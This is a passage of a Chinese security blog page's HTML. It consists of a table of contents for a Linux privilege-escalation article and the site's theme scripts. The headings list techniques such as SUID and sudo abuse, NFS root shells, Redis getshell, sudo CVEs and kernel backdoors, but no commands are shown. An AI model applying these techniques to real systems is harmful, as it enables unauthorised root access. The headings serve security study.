class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8F%92%E4%BB%B6"><span class="toc-text">服务&#x2F;插件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E6%97%A0%E6%98%8E%E6%96%87%E5%AD%98%E6%94%BE%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-text">有无明文存放用户密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E6%97%A0ssh-%E7%A7%81%E9%92%A5"><span class="toc-text">有无ssh 私钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%8E%E5%BD%93%E5%89%8D%E6%9C%BA%E5%99%A8%E9%80%9A%E4%BF%A1%E7%9A%84%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E6%88%96%E8%80%85%E4%B8%BB%E6%9C%BA"><span class="toc-text">查看与当前机器通信的其他用户或者主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%AE%AF%E4%B8%8E%E7%BD%91%E7%BB%9C"><span class="toc-text">通讯与网络</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E5%92%8C%E8%B7%AF%E7%94%B1"><span class="toc-text">缓存和路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%97%85%E6%8E%A2"><span class="toc-text">嗅探</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E9%9A%A7%E9%81%93"><span class="toc-text">端口转发和隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-text">配置信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-text">文件系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="toc-text">交互式shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E6%8F%90%E6%9D%83suid-ampamp-guid"><span class="toc-text">可提权SUID &amp;&amp; GUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%8F%AF%E5%86%99%E6%89%A7%E8%A1%8C%E7%9B%AE%E5%BD%95"><span class="toc-text">查看可写&#x2F;执行目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E8%BF%87%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-text">查看安装过的工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-linux%E6%8F%90%E6%9D%83"><span class="toc-text">0x04 Linux提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-text">SUID提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#find"><span class="toc-text">find</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vim"><span class="toc-text">Vim</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6so%E6%B3%A8%E5%85%A5%E6%8F%90%E6%9D%83"><span class="toc-text">二进制文件.so注入提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">内核漏洞提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#root%E6%97%A0%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83"><span class="toc-text">Root无密码提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-text">环境变量提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#echo%E5%91%BD%E4%BB%A4"><span class="toc-text">echo命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#copy%E5%91%BD%E4%BB%A4"><span class="toc-text">copy命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#symlink%E5%91%BD%E4%BB%A4"><span class="toc-text">symlink命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#echo%E5%91%BD%E4%BB%A4"><span class="toc-text">echo命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nano-%E7%BC%96%E8%BE%91%E5%99%A8"><span class="toc-text">nano 编辑器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%8F%B7%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="toc-text">点号配置错误提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-text">利用存在漏洞的命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-text">第三方服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#docker-%E7%BB%84%E6%8F%90%E6%9D%83"><span class="toc-text">Docker 组提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-udf-%E6%8F%90%E6%9D%83"><span class="toc-text">MySQL UDF 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis-%E6%89%B9%E9%87%8F-getshell"><span class="toc-text">Redis 批量 getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83"><span class="toc-text">抓取密码提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-text">计划任务提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-text">SUDO提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-vi%E6%8F%90%E6%9D%83"><span class="toc-text">sudo vi提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-more%E5%92%8C-less%E6%8F%90%E6%9D%83"><span class="toc-text">sudo more和 less提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-git-%E6%8F%90%E6%9D%83"><span class="toc-text">sudo git 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-nmap-%E6%8F%90%E6%9D%83"><span class="toc-text">sudo nmap 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-awk-%E6%8F%90%E6%9D%83"><span class="toc-text">sudo awk 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-find-%E6%8F%90%E6%9D%83"><span class="toc-text">sudo find 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-ed-%E6%8F%90%E6%9D%83"><span class="toc-text">sudo ed 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-python-%E6%8F%90%E6%9D%83"><span class="toc-text">sudo python 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2019-14287%E6%8F%90%E6%9D%83"><span class="toc-text">CVE-2019-14287提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2021-3156-%E6%8F%90%E6%9D%83"><span class="toc-text">CVE-2021-3156 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AF%E8%BF%9E%E6%8E%A5%E6%8F%90%E6%9D%83"><span class="toc-text">软连接提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B1cron%E4%BD%9C%E4%B8%9A%E6%8F%90%E6%9D%83"><span class="toc-text">例1：Cron作业提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B2%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-text">例2：临时文件提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nfs-%E6%8F%90%E6%9D%83"><span class="toc-text">NFS 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nfs%E6%9E%9A%E4%B8%BE"><span class="toc-text">NFS枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%82%E5%9C%A8nfs%E5%85%B1%E4%BA%AB"><span class="toc-text">挂在NFS共享</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%86%85%E9%83%A8nfs%E9%85%8D%E7%BD%AE"><span class="toc-text">枚举内部NFS配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91nfs%E5%85%B1%E4%BA%AB"><span class="toc-text">端口转发NFS共享</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD-nfs-%E5%85%B1%E4%BA%AB%E5%B9%B6%E6%8F%90%E6%9D%83"><span class="toc-text">挂载 NFS 共享并提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#root-shell-%E5%88%B6%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">Root Shell 制作漏洞利用程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#root-shell-%E5%A4%8D%E5%88%B6-binbash"><span class="toc-text">Root Shell 复制 &#x2F;bin&#x2F;bash</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%B3%A8%E5%85%A5%E6%8F%90%E6%9D%83"><span class="toc-text">通配符注入提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tar-%E6%8F%90%E6%9D%83"><span class="toc-text">Tar 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chmodampchown-%E6%8F%90%E6%9D%83"><span class="toc-text">chmod&amp;chown 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsync%E6%8F%90%E6%9D%83"><span class="toc-text">Rsync提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7z-%E6%8F%90%E6%9D%83"><span class="toc-text">7z 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip-%E6%8F%90%E6%9D%83"><span class="toc-text">Zip 提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#capabilities%E6%8F%90%E6%9D%83"><span class="toc-text">Capabilities提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rsync%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%8F%90%E6%9D%83"><span class="toc-text">Rsync未授权访问提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E5%BA%93%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-text">共享库劫持提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-text">共享对象劫持提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%89%B9%E6%9D%83%E7%BB%84%E6%8F%90%E6%9D%83"><span class="toc-text">利用特权组提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lxclxd%E6%8F%90%E6%9D%83"><span class="toc-text">LXC&#x2F;LXD提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker%E7%BB%84%E6%8F%90%E6%9D%83"><span class="toc-text">Docker组提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#disk%E6%8F%90%E6%9D%83"><span class="toc-text">Disk提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#adm%E6%8F%90%E6%9D%83"><span class="toc-text">ADM提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">其他漏洞提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-linux%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-text">0x05 Linux提权利用工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-linux%E5%86%85%E6%A0%B8%E9%AB%98%E7%BA%A7%E5%90%8E%E9%97%A8"><span class="toc-text">0x06-Linux内核高级后门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-linux%E6%8F%90%E6%9D%83%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA"><span class="toc-text">0x07-Linux提权环境靶场</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E9%A2%84%E9%98%B2%E6%8F%90%E6%9D%83"><span class="toc-text">0x08 预防提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x09 参考文章</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.28.1" async></script>
+
+<!-- optional -->
+
+  <script>
+    function load_twikoo() {
+        if (!document.querySelectorAll("#twikoo_container")[0]) return;
+        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
+            const el = document.getElementById("twikoo_container");
+            var path = el.getAttribute('comment_id');
+            if (!path) {
+                path = decodeURI(window.location.pathname);
+            }
+            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
+                el: '#twikoo_container',
+                path: path,
+            }));
+        });
+    }
+
+    window.addEventListener('DOMContentLoaded', (event) => {
+        load_twikoo();
+    });
+</script>
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
